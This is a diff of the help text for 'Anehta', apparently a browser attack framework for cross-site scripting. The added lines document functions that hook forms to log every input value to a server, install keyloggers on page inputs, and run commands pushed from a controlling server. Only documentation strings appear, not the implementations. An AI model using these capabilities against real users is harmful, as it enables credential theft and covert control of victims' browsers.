@@ -22,6 +22,8 @@ anehta.help = function(args){
 		  
 		case "dom":
 		  alert("Anehta dom API Help: \r\n\r\n" +
+		        "  anehta.dom.bindEvent(o, e, fn); //bind a function 'fn()' to Event 'e' of element 'o'\r\n\r\n" +
+		        "  anehta.dom.unbindEvent(o, e, fn); //unbind a function 'fn()' to Event 'e' of element 'o'\r\n\r\n" +
 		        "  anehta.dom.getDocument(targetwindow); //return the document object of the target window\r\n\r\n" +
 		        "  anehta.dom.addCookie(cookiename,value); //add a 'name=value;' to current cookies; return true/false\r\n\r\n" +
 		        "  anehta.dom.checkCookie(cookiename); //check if current cookies contain a cookie named 'cookiename'; return true/false\r\n\r\n" +
@@ -77,6 +79,19 @@ anehta.help = function(args){
 		        );
 		  break;
 		  
+		case "hook":
+		  alert("Anehta hook API Help: \r\n\r\n" +
+		        "  anehtaHook.hook('fnhooked', 'savedfn', 'fn'); //hook the fnhooked() function with fn() function; the original function will be save as savedfn().\r\n\r\n" +
+		        "  anehtaHook.unhook('fnhooked', 'savedfn'); //recover the fnhooked() function from the savedfn() function.\r\n\r\n" +
+		        "  anehtaHook.injectFn('fninjected', 'savedfn', 'fn'); //inject the fnhooked() function with fn() function; the original function will be save as savedfn().\r\n\r\n" +
+		        "  anehta.hook.hookSubmit(f, injectFn); //hook the submit of form 'f', and call injectFn() function before f's submit.\r\n\r\n" +
+		        "  anehta.hook.hookForm(f); //hook the submit of form 'f', and log all the inputs value to server.\r\n\r\n" +		      
+		        "  anehta.hook.hookAllForms(); //hook the submit of all forms in current page, and log the inputs value to server when a form is submiting.\r\n\r\n" +	      
+		        "  anehta.hook.installKeylogger(o, trigger); //install a keylogger on element 'o', trigger's value might be 'blur' or 'unload' which means when to trigger the logger.\r\n\r\n" +
+		        "  anehta.hook.installKeyloggerToAllInputs(); // install a keylogger to all the input and textarea tags in current page, trigger the logger when blur.\r\n\r\n"		      	      
+		        );
+		  break;		  
+		  
 		case "detect":
 		  alert("Anehta detect API Help: \r\n\r\n" +
 		        "  anehtaBrowser.type(); //sniffer the browser type in a reliable way; return msie/mozilla/opera/safari/chrome; also save a 'BrowserSniffer' in cache\r\n\r\n" +
@@ -106,6 +121,7 @@ anehta.help = function(args){
 		  		  
 		case "misc":
 		  alert("Anehta misc API Help: \r\n" +
+		        "  anehta.misc.realtimeCMD(); //inject a realtime module to current page and apply commands from anehta server.\r\n\r\n" +
 		        "  anehta.misc.getClipboard(); //get the clipboard's content(text); IE only.\r\n\r\n" +
 		        "  anehta.misc.setClipboard(); //set the clipboard's content(text); IE only.\r\n\r\n" +
 		        "  anehta.misc.getCurrentPage(); //return the current page's html code.\r\n\r\n"
@@ -121,7 +137,7 @@ anehta.help = function(args){
 		               
 		default:
 		  alert("Usage: anehta.help(args);\r\n" +
-		        "args could be: core,dom,net,logger,ajax,inject,detect,scanner,trick,misc,crypto \r\n\r\n" +
+		        "args could be: core,dom,net,logger,ajax,inject,hook,detect,scanner,trick,misc,crypto \r\n\r\n" +
 		        "example: anehta.help('core'); \r\n" +
 		        "  will show the anehta core api mannual.");
 	}	
